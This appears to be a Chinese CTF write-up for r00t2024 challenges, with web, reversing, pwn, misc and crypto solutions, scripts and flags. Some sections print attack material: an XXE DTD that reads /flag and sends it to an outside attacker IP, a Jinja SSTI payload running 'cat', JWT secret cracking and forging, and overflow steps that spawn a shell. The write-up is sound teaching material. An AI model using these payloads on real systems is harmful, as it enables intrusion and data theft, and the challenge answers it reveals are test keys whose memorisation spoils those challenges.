# week1

## web

### 苇苇口算

打开之后发现2s内做出口算题就算胜利，做完之后看到会向/end_game发送请求，试试开始游戏之后直接end_game，还真给flag了嘻嘻，其实这是非预期解，由于vv忘记加sessionid了不然怎么也是写脚本而不是人工，不然来不及

还有种解法是

看到了get_question的路由，返回了所有的题目和答案，这时候将返回包改一下，改成题目只剩一题再放回去，2s内做这一题就可以了，小猿口算以前也存在这个漏洞。

### 非标准寻访

python写脚本跑可以，用yakit不断发包也可以这里还是推荐写脚本

f12查看网络，点击抽一发，发现抽卡请求是/draw，并且会返回一个json，其中的type表示抽出来的是否是flag

```python
import requests
import json
while True:
    rep=requests.get('http://124.222.157.100:33106/draw').json()
    if rep['type']=='normal':
        pass
    else:
        print(rep)
        break
```

### 最爽射击游戏

可以直接传score，也可以修改js中打中一次加的分数

## re

### ez_re签到

隐藏放在了兴趣小组2024的Rev_new.md之中，旨在检测兴趣小组的教学质量，考察同学们的细心程度。（在课堂上说过）

### 你的微积分月考成绩

本题双击运行后，当选手的info的成绩大于等于100分时,直接可以获得Flag。

再者，如果成绩未满足if条件，那么我们将可以利用RE的工具；首先利用DIE查看，为32位的upx加壳，upx -d 脱壳后，即可拖入IDA-32bit中查看,快捷键shift +F12查看字符串关键词Flag或者直接搜索Flag关键字，仔细翻阅即可在一堆同名字符串中找到Flag。

### DHU_LLM

本题无加壳。本题有两种方式求解：

1.拖入IDA-32bit中查看,快捷键shift +F12查看字符串,对传统flag足够敏感的话，应该可以轻易得到相关的l0v3_Cs7字样，这是简便的解法，旨在跳出带有flag的字眼的局限性。

2.F5观察函数Getflag，很明显已经给出相关提示flag就在该函数逻辑之中，该函数是一个简单的数组复制，在for循环中复制等长的secret[8]字符至flag数组中去，而secret内容就在全局变量声明中为const常量，认真观察便可观察到其值，shift+e 由hex转decimal便可得到正确flag；

总结一下，常规方法更为复杂，需考虑逻辑，但是简易方法考察思维跳跃性。

### RC4

直接对数组数据进行RC4即可获取flag，密钥是r00t2024

flag：r00t2024{SyMm3TrY_1s_b3avt1fUl}

### maze

可以从maze数组以及check函数的内容，得到一个6\*6的迷宫，其中*是墙壁，#是出口，00位置为起点

迷宫如下：
--\*\*\**
\*-\*\*\*\*
\*----\*
\*\*\*\*-\*
\*\*\#\*-\*
\*\*---\*
得到路径 dssdddsssaaw,md5加密得到flag
r00t2024{79787f885bff9cd490b77c40b7768b7d}

### babyxor

ida里找到j((l*(*,c)/Gk++UkGa(mGsv(OG@(je然后和0x18进行异或

## pwn

### test_your_nc

nc连上直接ls，cat flag即可

### 谁要点菜

因为 pwn 题目的特殊性，基本知识了解的不深刻，做题会有些难度， 但本题有基础的同学可以做，萌新也可以通过题目描述找到答案哦 

#### 萌新思路：

1. 运行程序：

	

![image-20241126164722344](assests/11.png)

2.题目描述

![image-20241126164739105](assests/12.png)

3.题目描述可以看出，点了一道不够，又点了一道还不够，那咋办呢，点第三道试试

![image-20241126164755509](assests/13.png)

**可以看出输入 root 三次得到了 flag，是不是有点脑经急转弯的**

#### 基础思路：

1.运行程序：

![image-20241126164846774](assests/14.png)

2.根据题目描述：

![image-20241126164901281](assests/15.png)

3.是 r00t 要点菜，输入 r00t 试试

![image-20241126164930078](assests/16.png)

输出有问题

4.将可执行文件拖入 IDA 反编译源码

![image-20241126165000730](assests/17.png)

可以看到 

① 将 ccccccat flag 赋值给 command，代码最后执行了这个命令，但是显而易 见，正确的命令应该是 cat flag 而不是 ccccat flag 

② 有一个 read 函数可以输如 0x100 个字节的数据，但是 buf 的长度是 8 个字节， 因为__int64 类型是 long long 类型的，那么多输入的数据就会溢出覆盖 buf 到这里，如果对 pwn 有些基础了解的同学应该可以想到，我们现在的思路就是利 用无限制长度输入的 read 函数去将 ccccccat flag 覆盖为……\ncat flag,那么 system 函数遇到\n,会将前半部分当成一个命令，\n 符后当成另一个命令，也就执行了我 们的 cat flag。

5.那么应该输入多少字节实现覆盖呢

这个时候有两种办法，一个是用 IDA 查看静态代码，buf 距离 command 是 0x1E-0x16=8 个字节，ccccccat flag 中要覆盖前五个 c，也就是一共 13 个字节，其中第 13 个字节应该是\n,前 12 个字节随意，如下

![image-20241126165110149](assests/18.png)

最后多说一句 r00tr00tr00t\n 刚好也可以满足上面的 12 个字节加\n



## misc

### 签到题

兽语解密就可以了

### keyboard

ImageMagick

ImageMagick官网上可以下载到[一键下载](#windows)
![img](assests/wps1.jpg)![img](assests/wps2.jpg)一键下一步安装
到路径下看下名字、等下有用
![img](assests/wps3.jpg)到需要拼接的图片目录下，调用cmd

magick montage *.png -tile 19x12 -geometry +0+0 flag.png

使用gaps

gaps --image=flag.png --generation=30 --population=900 

然后观察键盘解码

r00t{i_l_i_k_e_m_i_s_c}

### lappland

用010改高度即可
r00t{she_is_so_beautiful}

### literally_me

识图得知这是银翼杀手2049中的截图
r00t{ryan_gosling_1980_11_12}

### 这就是成图了吗？

分离成图.png文件中的zip压缩包，解压得到前半段flag的二维码，用Stegsolve打开草稿.png，Analyse->Image Combiner加入成图，查看两图相减的结果，得到后半段flag的二维码

### 还不完，真的还不完

社会主义核心价值观编码器
r00t{en_qing_zhen_de_huan_bu_wan}

### 我喜欢拉普兰德

f5隐写即可
r00t{i_love_lappland}

### 老游新整

第一问“打通”：`r00t{h3s_a1w@y5_up_t0_s0meth1n9}`  
第二问“无伤”：`r00t{h3_n3ver_le@v3_3m_hun9ry}`

魔改版本的[《混乱大枪战》初代](https://www.4399.com/flash/58793.htm)，打包成了可以独立运行的格式。除去一些零碎且不影响游戏性的小改动，魔改的部分主要围绕添加的开局武器拳击手套。作为全游戏唯一一款近战武器，拳击手套威力不俗（击退等同于中档狙击枪），但对玩家走位要求更高。使用拳击手套通过战役模式Boss 2时（游戏里有提示；2P时两个玩家必须都满足条件）可以获得第一问flag；若不损失命数无伤过关，则可以同时获得第一问和第二问flag。flag藏于1P的玩家名中，新开一局游戏，在屏幕左上角的死亡报告里就能看见。

除了真的努力打通游戏之外，这道题还有两种预期解。其一是更CTF的解法，从打包的EXE中提取Flash游戏本体SWF文件（实测用7-Zip的Parser模式就可以做到），然后用JPEXS之类的反编译工具就能看到游戏源码了，两个flag都在游戏第一帧的动作脚本里。其二是作弊；二阶段提示和魔改过的Credits页面都提到了作弊码，且一个暗示一个明示了作弊码是什么。在游戏中按出[科乐美秘技](https://baike.baidu.com/item/%E7%A7%91%E4%B9%90%E7%BE%8E%E7%A7%98%E6%8A%80/204021)“上-上-下-下-左-右-左-右-开枪-炸弹”即可把命数改为30并开启护盾，同时获得战役第八关同款一击必杀狙击枪。对打Boss的实际效果而言，只要有基本走位保证不会被连续连招带走，30条命解决Boss已经相当足够；“无伤”的判定只要求剩余命数大于关卡开始时的命数，故第二个flag也是轻松可解。

#### 花絮

爷青回！终于有机会用小时候最喜欢的小游戏之一出题了。正好最近在写[这款游戏的TCRF页面](https://tcrf.net/Gun_Mayhem)，从代码里翻出来了原开发者做到80%但弃坑了的拳击手套，觉着“在枪战游戏里不开枪是一件很酷的事情”，就把代码恢复出来出成题了。说起来，鄙人其实更喜欢玩《混乱大枪战2》，怎奈这一部战役关卡太多，真要出成题就太过坐牢了。至于《混乱大枪战Redux》（4399上叫《混乱大枪战新版》）……等我啥时候能打通了再说吧……

这道游戏题其实最早是想出MC题的，大体思路是类似“打羽毛球”但换成潜行玩法，延续奶茶题故事线；不过数据包写到一半自己试玩的时候发现不是一般的坐牢，就弃坑了（

本题第二问向xyy谢✌致敬，让我们永远铭记他参加CTF比赛期间仍在挑战自己，做到了队内首例无作弊无伤拳套打通Boss的英勇事迹。~~明明只是叫他来测试下游戏难度的，抖M人设坐实了~~ ~~这回你们知道Boss打不过出不了flag应该去暴打谁了吧~~



## crypto

### 听说你学懂了base64

首先根据题目描述，用010打开png，得到一串：

```
i think u need this : 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/=
```

可知这是替换后的新表。

然后打开密文后，发现他是一行一行的base64，与我们常见的一整段，只有末尾有等号的base64不太一样。这里实际上是利用了base64等号其实是因为不足六位而补0得到的，由于在解密的时候末尾的填充会被省略去，所以实际上我们可以在填充的位置隐藏我们想要的信息，事实上flag也被隐藏在这里。

利用脚本提取，注意，因为一行最多能藏两个等号的信息，所以行数很多，其实也给了我们一个提醒，如果以后遇到了行数很多的base64，大概率就是这样隐藏的

```python
d = '''

'''  # 将加密后的内容放到这个多行字符串中

base64chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/="
e = d.splitlines()  # 将输入字符串按行分割
binstr = ""  # 初始化二进制字符串为空

# 遍历每行内容
for i in e :
    if i.find("==")>0:
        temp=bin((base64chars.find(i[-3])&15))[2:]
    #取倒数第3个字符，在base64找到对应的索引数（就是编码数），取低4位，再转换为二进制字符
        binstr=binstr + "0"*(4-len(temp))+temp #二进制字符补高位0后，连接字符到binstr
    elif i.find("=")>0:
        temp=bin((base64chars.find(i[-2])&3))[2:] #取倒数第2个字符，在base64找到对应的索引数（就是编码数），取低2位，再转换为二进制字符
        binstr=binstr + "0"*(2-len(temp))+temp #二进制字符补高位0后，连接字符到binstr
str_ = bytearray()
for i in range(0, len(binstr), 8):
    if i + 8 <= len(binstr):
        index = int(binstr[i:i + 8], 2)  # 每 8 位转换为索引值
        if 0 <= index < 256:  # 确保索引值在有效范围内
            str_.append(index)  # 追加字节数据到 bytearray

print(str_.decode('utf-8'))  
```

### 猫猫密码

根据观察，以及题目提示，`不是我不想让他小写，而是真的没有小写`，可以想到摩斯密码是无法分辨大小写的。

又因为全篇只有两种重复，`喵喵？`和`喵喵喵`，于是尝试一下一个是`.`一个是`-`即可：

```python
str = ""
count = 0
output = ""
with open ('flag.txt','r',encoding='utf-8') as f:
    for line in f:
       str += line
for i in str:
    if i == "喵":
        if count == 2:
            output += '.'
            count = 0
        else:
            count += 1
    elif i == "？":
        output += '-'
        count = 0
    elif i == " ":
        output += ' '
print(output)
```

### 仿射仿射

实际上就是一个把26个字母拓展到31个字符的仿射，注意a和m要互素，这里a=30，m是31，如果还是按照26的话，就没有a逆了



# week2

## web

### 苇苇口算升级版

这次每道题都需要发回服务器检查，那没办法了，只能写脚本快速做题了

```python
import requests
import time

BASE_URL = "http://127.0.0.1:8800"  # 修改为你的服务器地址

# 启动游戏
def start_game():
    response = requests.post(f"{BASE_URL}/start_game")
    if response.status_code == 200:
        print("Game started successfully.")
    else:
        print("Failed to start the game.")
        exit(1)

# 获取问题
def get_question():
    for _ in range(3):  # 尝试3次获取问题
        response = requests.get(f"{BASE_URL}/get_question")
        if response.status_code == 200:
            data = response.json()
            if "question" in data:
                return data.get("question")
            else:
                time.sleep(0.1)  # 如果获取问题失败，等待0.1秒再试
    print("Failed to get question after 3 attempts.")
    exit(1)

# 提交答案
def submit_answer(answer):
    response = requests.post(f"{BASE_URL}/submit_answer", json={"answer": answer})
    if response.status_code == 200:
        data = response.json()
        print(data)
        return data
    else:
        print("Failed to submit answer.")
        exit(1)

# 自动答题脚本
def auto_play():
    start_game()
    correct_count = 0

    while correct_count < 10:
        question = get_question()
        if question:
            # 解析题目
            num1, _, num2 = question.split()
            num1, num2 = int(num1), int(num2)

            # 计算答案
            if num1 > num2:
                answer = ">"
            elif num1 < num2:
                answer = "<"
            else:
                answer = "="

            # 提交答案并获取结果
            result = submit_answer(answer)
            if result.get("status") == "correct":
                correct_count += 1
                print(f"Answered correctly: {correct_count}/10")
            elif result.get("status") == "incorrect":
                print("Incorrect answer, game over.")
                break
        time.sleep(0.1)  # 确保不会太快以防服务器压力过大


if __name__ == "__main__":

    auto_play()

```

### 非标准寻访后记

只有vv能抽到flag，那么就要想办法让服务器认为我是vv咯，想想服务器是如何获取我们身份的，一般会看看我们的cookie

```
cookie:

jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QifQ.f6LlphhWFq9tWAIIapPp5992MPDPoybDUYV4HRcpWsU
```

提示的很明显是一串jwt，那么搜搜jwt是什么，搜完你就能发现，现在我是guest，如果role变成vv那应该是能抽出来了，但是jwt最后一串签名让我们不好更改前面的内容，如果只改了前面不改后面，服务器发现签名解密后与前面的不符合就会抛出错误，那么我们需要爆破密钥来更改后面的签名，利用jwt_tools爆破就行

```shell
weiwei@vv-laptop /m/d/C/W/jwt_tool (master) [1]> python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3V
lc3QifQ.f6LlphhWFq9tWAIIapPp5992MPDPoybDUYV4HRcpWsU -C -d password.txt

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

[+] secret is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "secret"
```

```python
import jwt
# 定义头部（Header）
header = {
    "alg": "HS256",
    "typ": "JWT"
}
# 定义负载（Payload）
payload = {
    "role": "vv"
}
# 密钥（Key）
secret_key = "secret"
token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)
print(token)
#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidnYifQ.JNGUsBcqTN5sBHETncoddUCd2ZdiQkyLF8qJ_yUYRNE
```

改一下cookie，再抽一发就能抽出啦

### Ezjava

主页提示路由 `/vuln` ，访问后有本题的提示：

```
为什么是Java?Jar包能干嘛?JDBC依赖是什么?CVE是什么?XXE是什么?怎么读取到Flag?SQL是什么?上哪去搭恶意服务?读了Flag却看不到?那咋办呢o.O?
```

下载的jar包可以用 [jadx-gui](https://github.com/skylot/jadx) 反编译，拿到源代码后关注 `org.example.ezjava` 这个包的内容，里面就是本体的源码，在"MainController"中能看到POST访问 `/vuln` 路由时，用户可以传入自定义的 jdbc 连接串，通过该连接串 jdbc 将会访问指定的远程数据库，从库中的 `exp` 表中访问记录的 `content` 内容，并将其作为XML解析。

```java
 @PostMapping({"/vuln"})
    public String vuln(@RequestParam(value = "jdbc_conn", defaultValue = "") String jdbc_conn) throws SQLException, ClassNotFoundException {
        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection connection = DriverManager.getConnection(jdbc_conn);
        if (connection != null) {
            Statement statement = connection.createStatement();
            statement.execute("select * from exp");
            ResultSet resultSet = statement.getResultSet();
            while (resultSet.next()) {
                SQLXML sqlxml = resultSet.getSQLXML("content");
                sqlxml.getSource(DOMSource.class);
            }
            return "O.o你拿到flag了吗?";
        }
        return "O.o你拿到flag了吗?";
    }
```

结合提示与搜索引擎能够找到这是个公开漏洞：CVE-2021-2471。漏洞细节大家自己搜索技术博客学习，简单来说就是 `SQLXML` 这个类的 `getSource` 方法允许XXE攻击。提示中给出flag的位置在根目录下，我们需要用XXE读取 `/flag` 文件并将其外带。我们需要在公网（服务器或者内网穿透）搭建一个Mysql服务，任意创建一个库，添加一张名为 `exp` 表格，保证其有 `content` 字段，并写入一条记录，其 `content` 字段的内容是 XXE 的攻击 payload 即可。关于 XXE 的攻击细节自行学习，下面提供参考的攻击流程与payload。

---

假设公网有一台用于攻击的服务器，其IP是 `233.233.233.233`：

1. 使用 `23333` 端口监听外带的flag：

	```bash
	nc -lvnp 23333 
	```

2. 搭建静态网页服务，服务起在 80 端口，放置一个恶意dtd文件，其路径为静态网站根目录下的：`XXE/evil.dtd` ，内容：

	```dtd
	<!ENTITY % secret SYSTEM "file:///flag">
	<!ENTITY % evil_dtd "<!ENTITY &#37; exp SYSTEM 'http://233.233.233.233:23333/?res=%secret;'>">
	%evil_dtd;
	%exp;
	```

3. Mysql服务搭建在 3306 端口，账户密码为 `root:root`，创建一个名为 `Test` 的数据库，创建一张 `exp` 表：

	```mysql
	CREATE TABLE `exp` (
	  `id` int NOT NULL AUTO_INCREMENT,
	  `content` text,
	  PRIMARY KEY (`id`)
	) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
	```

	插入一条记录：

	```mysql
	insert into `exp`(content) values('<?xml version="1.0" encoding="utf-8"?><!DOCTYPE remote SYSTEM "http://233.233.233.233:80/XXE/evil.dtd">');
	```

4. 确保上述服务都搭建完毕，且都可以被正确的访问（不行的话检查服务状态和防火墙），然后POST访问 `/vuln` 路由，需要传入的jdbc连接串如下：

	```mysql
	jdbc:mysql://233.233.233.233:3306/Test?user=root&password=root
	```

	传参时需要URL编码，最后传入的参数长这样：

	```php
	jdbc_conn=jdbc%3Amysql%3A%2F%2F233%2E233%2E233%2E233%3A3306%2FTest%3Fuser%3Droot%26password%3Droot
	```

	如果你的操作正确，你能在监听外带信息的端口看到类似如下的请求包：

	```bash
	Listening on 0.0.0.0 23333
	Connection received on 124.222.157.100 52522
	GET /?res=r00t2024{5a124970-b219-4818-8460-76a5ce491df7} HTTP/1.1
	User-Agent: Java/17-ea
	Host: 233.233.233.233:23333
	Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
	Connection: keep-alive
	```


### 神秘的水晶球

经典的ssti，输入{{7*7}}，发现回显是49，可知这里有ssti注入，那么在尝试的过程中会发现ban掉了一些字符，比如`class`、`flag`，那么我们就需要绕过，此处我采取的方式是字符串的拼接，注意当你采取字符串拼接的时候就需要用中括号来访问，而不是`.`

最终payload:

`{{''['__cla'+'ss__'].__base__['__subcla'+'sses__']()[132].__init__.__globals__["po"+"pen"]("cat"+" fla"+"g.txt").read()}}`

## re

### 复仇？！

可以发现sub_41116D和sub_411118两个函数无法识别

![image-20241113090313304](assests/1.png)

查看汇编会发现是加了花指令

![image-20241113090703662](assests/2.png)

第一个花是jz和jnz的互补跳转，将E8 nop掉即可

在函数起始位置按p重新编成函数

![image-20241113090843399](assests/3.png)

第二个花是是一个永真跳转

![image-20241113090953836](assests/4.png)

同样将E9的jmp nop掉即可

![image-20241113091045617](assests/5.png)

可以根据两个函数发现还是RC4加密，但是做了魔改，在加密函数的最后一步异或了0x24，所以不能直接用工具了，需要自己写脚本解密

exp如下

```c++
#include <stdio.h>
#include <string.h>
#include<stdlib.h>
#include<stdint.h>

void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len)
{
    int i = 0, j = 0;
    char k[256] = { 0 };
    unsigned char tmp = 0;

    for (i = 0; i < 256; i++)
    {
        s[i] = i;
        k[i] = key[i % Len];
    }
    for (i = 0; i < 256; i++)
    {
        j = (j + s[i] + k[i]) % 256;
        tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
    }
}

void rc4_crypt(unsigned char* s, unsigned char* Data, unsigned long Len)
{
         

    int i = 0, j = 0, t = 0;
    unsigned long k = 0;
    unsigned char tmp;
    
    for (k = 0; k < Len; k++)
    {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
        t = (s[i] + s[j]) % 256;
        Data[k] =Data[k] ^ s[t] ^ 0x24 ;
    }
}

int main()
{
    unsigned char s[256] = { 0 }, s2[256] = { 0 };
    char key[] =  "2024r00t" ;
    unsigned char flag[] = {0x76, 0xEF, 0x08, 0x29, 0xD0, 0x75, 0x1C, 0x95, 0xA2, 0x1D, 
  0xC2, 0xAC, 0xDD, 0x41, 0xEB, 0x5E, 0x58, 0xE0, 0x43, 0xBE, 
  0x9D, 0xB3, 0x63, 0xE9, 0x95, 0x88, 0x47};
    int i = 0;
    int len =27;
    
    rc4_init(s, (unsigned char*)key, strlen(key));
    rc4_crypt(s, flag, len);
    
    for(int i=0;i<len;i++){
        printf("%c", flag[i]);
    }

    return 0;
}
```

### 窃听风云

附件是一个whl文件，可以通过pip安装到自己的python上，可以通过help命令了解详细内容

![image-20241115220526965](assests/6.png)

根据其中的方法与提示，写出如下脚本获取box中的信息

```python
import qtfy
help(qtfy)

b = qtfy.box()
e = qtfy.eavesdropping_device()
for t in range(10000):
    e.eavesdrop(b,t)
```

结果如下

YSAqIC0zMiArIGIgKiA5MCArIGMgKiA5OCArIGQgKiAyMyArIGUgKiA1NSA9PSAzMzMzMjIKYSAqIC0zMjIgKyBiICogMzIgKyBjICogNjggKyBkICogMTIzICsgZSAqIDY3ID09IDcwNzcyNAphICogLTM0ICsgYiAqIDMyICsgYyAqIDQzICsgZCAqIDI2NiArIGUgKiA4ID09IDEyNzI1MjkKYSAqIC0zNTIgKyBiICogNSArIGMgKiA1OCArIGQgKiAzNDMgKyBlICogNjUgPT0gMTY3MjQ1NwphICogLTMyMSArIGIgKiA5NzAgKyBjICogOTM4ICsgZCAqIDIzMSArIGUgKiA1NTUgPT0gMzM3MjM2Nw==

可以知道是base64编码，解码：

![image-20241115220735189](assests/7.png)

利用z3算出abcde的值

```python
from z3 import *

a,b,c,d,e = Ints('a b c d e')
solver = Solver()
solver.add(a * -32 + b * 90 + c * 98 + d * 23 + e * 55 == 333322)
solver.add(a * -322 + b * 32 + c * 68 + d * 123 + e * 67 == 707724)
solver.add(a * -34 + b * 32 + c * 43 + d * 266 + e * 8 == 1272529)
solver.add(a * -352 + b * 5 + c * 58 + d * 343 + e * 65 == 1672457)
solver.add(a * -321 + b * 970 + c * 938 + d * 231 + e * 555 == 3372367)

solver.check()
print(solver.model())
```

[d = 4544, e = 1754, a = 123, b = 777, c = 677]

flag：r00t2024{123_777_677_4544_1754}

### 团结一心的r00t

这道题难度较大，由flag1和flag2组成。Flag1在ida中点击encrypt_flag1有多处指向性暗示，例如缓冲区数组的char[256]，const里的字符串，函数中的三个字符一组的划分都是指向了base64加密，不难看出不管输入什么最终都会被赋值为dV9hcjNfdGgzXw==，在线或者编程解码后是u_ar3_th3_即第一段。第二段加密原理为每个字符ascii码值-3再反转，写脚本解码即可。

```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define _CRT_SECURE_NO_WARNINGS  // 禁用安全警告

// flag2 解密函数：反转字符串，然后每个字符 ASCII 值加上 3
char* decrypt_flag2(const char* input) {
    size_t length = strlen(input);
    char* result = (char*)malloc(length + 1);
    if (result == NULL) return NULL;

    // 反转加密的字符串
    printf("Reversing the string: ");
    for (size_t i = 0; i < length; i++) {
        result[i] = input[length - i - 1];  // 正确反转
    }

    // 打印反转后的字符串
    printf("Reversed string: %s\n", result);

    // 对每个字符的 ASCII 值加上 3（确保不会超出可打印字符范围）
    for (size_t i = 0; i < length; i++) {
        result[i] = result[i] + 3;  // 恢复字符
        // 确保恢复后的字符在有效的 ASCII 范围内
        if (result[i] < 32 || result[i] > 126) {
            printf("Warning: Character out of printable ASCII range! ('%c' -> '%c')\n", result[i] - 3, result[i]);
        }
        printf("Character '%c' -> '%c'\n", result[i] - 3, result[i]);  // 打印字符转换过程
    }

    result[length] = '\0';  // 字符串结束符
    return result;
}

int main() {
    // 输入加密后的字符串
    char input[256];
    printf("Please enter the encrypted flag2 string: ");
    fgets(input, sizeof(input), stdin);

    // 移除输入字符串的换行符
    input[strcspn(input, "\n")] = 0;

    // 解密 flag2
    char* decrypted_flag2 = decrypt_flag2(input);
    if (decrypted_flag2 != NULL) {
        printf("Decrypted flag2: %s\n", decrypted_flag2);  // 输出解密后的字符串
    }
    else {
        printf("Memory allocation failed for decryption.\n");
    }

    // 释放内存
    free(decrypted_flag2);

    return 0;
}
```

### destination

本题是一道upx改壳题，用010editor查看三处标记位upx0,upx1,upx!，容易发现被更改了55字节，补上后便可以轻松脱壳，在ida发现是冒泡排序，之后便轻易对原始字符串进行排序得到flag。

## pwn

### 俄罗斯方块

1.checksec查看文件基本信息，发现是64位程序

![image-20241106154453636](assests/21.png)

2.拿到可执行文件放在IDA里看一下源码，64位程序用64位IDA打开,一进主函数就发现了system("bin/sh")

![image-20241106155249914](assests/22.png)

看看题目的描述和提示：让我们输入一个游戏需要的边界高度

![image-20241106154716367](assests/23.png)

经过测试还有源码分析

![image-20241106154905375](assests/25.png)

输入大于5的数或者大于0小于3的数都是不被允许的

目前看来只能输入4或者5，但是运行起来发现，4或5的边界根本不足以完成消除一行的目标，真的有人拼手速能达到吗hh，如果有私信我请你喝奶茶哈哈辛苦了😀

再看题目还有一个提示，整数溢出，在这里检验的时候，是说height不能大于5，也不能小于3，但是仔细观察，判断是否小于三的时候用的是unsigned int，去学习了整数溢出的相关知识就会知道，int类型的负数转换成unsigned int时，会变成很大的正数，所以只要我们输入随便一个负数就完成了绕过

![image-20241106155335441](assests/26.png)

![image-20241106155737464](assests/27.png)

这个时候游戏就开始了，他给了我们足够大的边界，消除一行就很简单了

![image-20241106160218161](assests/28.png)

消除一行后，会弹出shell，ls，cat flag，完成

![image-20241106160150442](assests/29.png)

### ezstack

1.拿到程序checksec查看程序没有canary检测，也没有pie偏移，是32位程序

![img](assests/clip_image002.png)

2.运行一下，程序接受一个输入，再将我们的输入回显

![img](assests/clip_image004.png)

3.将二进制文件放入IDA

![img](assests/clip_image006.png)

我们输入的地方是fgets，fgets函数允许我们输入最多31个字符，而s数组的大小是64，要想在这溢出是不可能的，接着向下分析

![图形用户界面, 文本, 应用程序  描述已自动生成](assests/clip_image008.png)

replace函数引起了我们的注意，在点进replace函数之前我们就应该想到，它的作用就是替换字符串，点进去发现它的逻辑主要在这几个地方，其中s和s2，n是我们传入函数的参数，s即为用户输入的字符串，“r”,对应的形参是s2，’root’对应形参src

![手机屏幕的截图  描述已自动生成](assests/clip_image010.png)

![img](assests/clip_image012.png)
 ![文本  描述已自动生成](assests/clip_image014.png)

通过对程序分析，发现他就是把我们输入的字符串中的r统统替换成root四个字符，所以尽管我们只能输入31个字符，但如果我们输入31’r’，就会被替换为31个‘root’

31*4也就是124

回到main函数继续分析，被替换后的s字符串赋给了dest，而dest这个数组长度只有32，也就是让我们有了溢出的可能

![img](assests/clip_image016.jpg)

4.接下来就看看溢出多少个字节，有没有system(“/bin/sh”)函数，有system则直接跳到system函数执行

![img](assests/clip_image018.png)

可以看出溢出字节是0x24+4

5.程序中也存在可以直接利用的system函数

![图形用户界面, 文本  描述已自动生成](assests/clip_image022.png)

![img](assests/clip_image024.png)

调用system(“/bin/sh”)的function函数地址为0x804931C

6.攻击脚本如下

本地打通后注释掉process，启用remote连接

![img](assests/clip_image026.png)

 

## misc

### ez_jail

实际上就是ban了很多东西之后，让你base64加密一下你要执行的命令，执行之后让s=box，而box被ban了，那么其实可以用全角字符绕过：`cz3vvKLvvK/vvLgK`，也就是 s=ＢＯＸ 的base64

当然由于box是s盒的内容，其实也可以构造s盒：

`r=lambda x,s:(x<<s|x>>8-s)&255\ns=['63']*256;p=q=1\nfor o in[0]*255:p=(p^(p*2)^[27,0][p<128])&255;q^=q*2;q^=q*4;q^=q*16;q&=255;q^=[9,0][q<128];s[p]=f'{q^r(q,1)^r(q,2)^r(q,3)^r(q,4)^99:02x}'`

### 终极谜语人

flag：`r00t{464ff077b7e7896d0ead9a7398ae98a3}`  
「至高奥义」：`做梦 意念 权限 内在 真相 措辞 修改 回家 黄红 污渍 扭曲 图片`

一张无法互动的MC地图，矗立的石碑中央嵌着一个[文本展示实体](https://zh.minecraft.wiki/w/%E5%B1%95%E7%A4%BA%E5%AE%9E%E4%BD%93)，正常情况下无法看到里面的文本。看起来很离谱，但其实本题的预期解有相当多种，操作难度的上下限差别很大（题目原定名叫“八仙过海”来着，期待各位各显神通）：

- 用下载服务端地图的工具或者MOD把地图下载到本地打开，切换到创造模式，把石碑砸碎
	- 注意文字是以实体形式存在的，所以用的工具或者MOD必须支持保存实体（实测[WorldTools](https://modrinth.com/mod/worldtools)可以用，但[Minecraft World Downloader](https://github.com/mircokroon/minecraft-world-downloader)就保存不了实体）
- 做一个自定义黑色混凝土（石碑材质）[方块模型](https://zh.minecraft.wiki/w/%E6%A8%A1%E5%9E%8B#%E6%96%B9%E5%9D%97%E6%A8%A1%E5%9E%8B)的资源包，让石碑不可见
	- 例如可以修改黑色混凝土的方块状态（`assets/minecraft/blockstates/black_concrete.json`），用屏障方块的模型（`minecraft:block/barrier`）替换黑色混凝土的模型（`minecraft:block/black_concrete`），进入游戏应用资源包，石碑就透明了
	- 一个如此改好的资源包参见`rtctf24h2-solver.zip`，适用MC版本1.20.6
- 用带自由视角之类功能的MOD或挂端直接穿墙看字
- ~~发现服务器没开正版验证而且出题人名字的账号有OP权限，直接登上服务器把石碑砸了（~~ 漏洞已修复
- 发现服务器没开正版验证而且出题人名字的账号是旁观模式，穿墙看字

~~不是每种预期解出题人都试过就是了（~~

然后你就会得到一屏幕不明所以的汉字，其中若干字词被打码了（`§k`），不停变化，看不出是什么。恢复这些字词同样有若干种预期解：

- （如果下载了地图）用游戏内的[`/data get entity`命令](https://zh.minecraft.wiki/w/%E5%91%BD%E4%BB%A4/data)获取文本展示实体的NBT数据，其中被打码的文本是可见的
- （同样要下载地图）直接去存档的`entities`文件夹里[手动解析实体数据](https://zh.minecraft.wiki/w/%E5%AE%9E%E4%BD%93%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F#.E5.AD.98.E5.82.A8.E6.A0.BC.E5.BC.8F)
- 如果直接去网上搜索这些汉字构成的部分完整句子，不难发现原文出自游戏《控制》的[“希斯魔咒”](https://control.fandom.com/zh/wiki/%E5%B8%8C%E6%96%AF%E9%AD%94%E5%92%92)（有删减且顺序被打乱）；对照原文完形填空即可
- 给游戏写个MOD禁用[JSON文本组件](https://zh.minecraft.wiki/w/%E6%96%87%E6%9C%AC%E7%BB%84%E4%BB%B6)的`obfuscated`属性
